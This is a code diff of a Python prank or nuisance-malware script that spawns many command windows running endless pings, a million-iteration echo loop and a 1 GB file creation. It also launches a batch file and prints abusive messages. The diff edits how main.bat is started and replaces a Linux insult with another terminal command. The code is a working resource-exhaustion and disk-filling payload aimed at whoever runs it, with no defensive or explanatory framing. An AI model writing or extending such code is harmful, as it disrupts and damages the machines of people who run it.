@@ -6,6 +6,7 @@ import threading
 import random
 import ctypes
 from ctypes import wintypes
+
 from pathlib import Path
 
 # Function to check if pynput is installed, and install it if necessary
@@ -72,7 +73,7 @@ os.system("color 04")
 os.system('echo "You fucked up"')
 time.sleep(2)
 
-bat = Path(__file__).parent / "main.bat"
+
 
 # Function to open a command-line task based on the OS
 def open_task():
@@ -81,11 +82,11 @@ def open_task():
         CR2 = random.choice(list2)
         CR3 = random.choice(list1)
         CR4 = random.choice(list2)  # Windows
-        bat = Path(__file__).parent / "main.bat"
-        os.startfile(str(bat.resolve()))  # opens like double-clicking the file
+        subprocess.Popen("./main.bat", shell=True)
+
         os.system(f'start cmd /k "color {CR1}{CR2} & ping 192.168.1.1 -t & for /L %i in (1,1,1000000) do @echo %i*%i & fsutil file createnew C:\temp\bigfile.txt 1073741824 & color {CR3}{CR4}"')
     else:  # Mac/Linux
-        print("Filthy linux, go fuck yourself")
+        os.system('x-terminal-emulator start cmd.exe /k "color 0a & tree"')
 
 def open_many_tasks(n):
     for _ in range(n):
